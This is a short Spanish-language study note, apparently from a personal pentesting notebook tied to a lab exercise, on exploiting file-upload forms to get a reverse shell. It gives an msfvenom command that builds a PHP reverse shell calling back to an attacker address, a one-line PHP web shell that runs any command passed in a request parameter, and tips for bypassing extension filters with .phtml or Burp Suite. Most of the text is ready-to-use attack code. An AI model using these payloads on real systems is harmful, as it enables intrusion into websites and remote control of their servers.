
Este es un tipo de ataque en el que subimos un archivo malicioso a una web con el obejtivo de obtener una reverse shell.
**Ataque mas simple**
En su forma mas simple simplemente subiremos un script malicioso usando msfvenom a la página web, para ampliar mas mirar [[SECTALKS BNE0X03 - SIMPLE (File Upload, Fuzzing)]]
```bash
msfvenom -p php/reverse_php LHOST=10.0.2.4 LPORT=443 -f raw -o pwned.php
```


**Webshell**
Para ello subiremos un archivo php con el siguiente código
```php
<?php 
	echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>";
?>
```
Una vez echo esto podemos enviar una shell reversa a nuestra máquina atacante

**Si no admite alguna extension**
Si la extensión .php no funciona deberíamos probar con otras como el .phtml
Y en caso de que eso no funcione deberíamos utilizar BurpSuite para interceptar la comunicación y cambiar el nombre de la extensión mediante burpsuite